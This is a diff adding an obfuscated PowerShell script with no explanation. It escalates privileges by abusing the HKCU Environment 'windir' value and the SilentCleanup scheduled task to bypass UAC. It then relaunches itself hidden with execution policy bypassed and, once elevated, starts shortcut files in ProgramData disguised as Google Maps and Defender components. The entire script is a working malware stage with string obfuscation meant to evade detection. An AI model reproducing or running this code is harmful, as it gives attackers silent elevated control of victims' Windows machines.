@@ -1,0 +1,41 @@
+
+
+if((([System.Security.Principal.WindowsIdentity]::GetCurrent()).groups -match "S-1-5-32-544")) {
+
+start-sleep -s 3
+start "C:\ProgramData\Google\Maps\Defender.lnk"
+
+start-sleep -s 30
+Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
+start-sleep -s 9
+Start "C:\ProgramData\Google\Maps\Microsoft Arts\Start\Maps.lnk"
+
+} else {
+	
+    $rn7pZcoWFpm1 = "^&_*-(t^&_*-(n^&_*-(e^&_*-(m^&_*-(n^&_*-(o^&_*-(r^&_*-(i^&_*-(v^&_*-(n^&_*-(E^&_*-(\^&_*-(:^&_*-(U^&_*-(C^&_*-(K^&_*-(H^&_*-("
+    $rn7pZcoWFpm1 = $rn7pZcoWFpm1.ToCharArray()
+    [Array]::Reverse($rn7pZcoWFpm1)
+    $jGLnrNQgWVtH = (-join $rn7pZcoWFpm1)
+    $jGLnrNQgWVtH = $jGLnrNQgWVtH.Replace("(-*_&^","")
+
+    $vGj9jkbs0Jxq = "^&_*-(r^&_*-(i^&_*-(D^&_*-(n^&_*-(i^&_*-(W^&_*-("
+    $vGj9jkbs0Jxq = $vGj9jkbs0Jxq.ToCharArray()
+    [Array]::Reverse($vGj9jkbs0Jxq)
+    $Yx3Ub1D3A8mz = (-join $vGj9jkbs0Jxq)
+    $Yx3Ub1D3A8mz = $Yx3Ub1D3A8mz.Replace("(-*_&^","")
+    
+    
+    
+     $lsXAoaAD7Gz4 = "^&_*-(p^&_*-(o^&_*-(w^&_*-(e^&_*-(r^&_*-(s^&_*-(h^&_*-(e^&_*-(l^&_*-(l^&_*-( ^&_*-(-^&_*-(e^&_*-(p^&_*-( ^&_*-(b^&_*-(y^&_*-(p^&_*-(a^&_*-(s^&_*-(s^&_*-( ^&_*-(-^&_*-(w^&_*-( ^&_*-(h^&_*-( ^&_*-($PSCommandPath;#^&_*-("
+     $lsXAoaAD7Gz4 = $lsXAoaAD7Gz4.Replace("^&_*-(","")
+     
+ 
+
+    Set-ItemProperty -Path $jGLnrNQgWVtH -Name $Yx3Ub1D3A8mz -Value $lsXAoaAD7Gz4
+
+    
+    schtasks /run /tn \Microsoft\Windows\DiskCleanup\SilentCleanup /I | Out-Null
+    Remove-ItemProperty -Path $jGLnrNQgWVtH -Name $Yx3Ub1D3A8mz
+	
+}
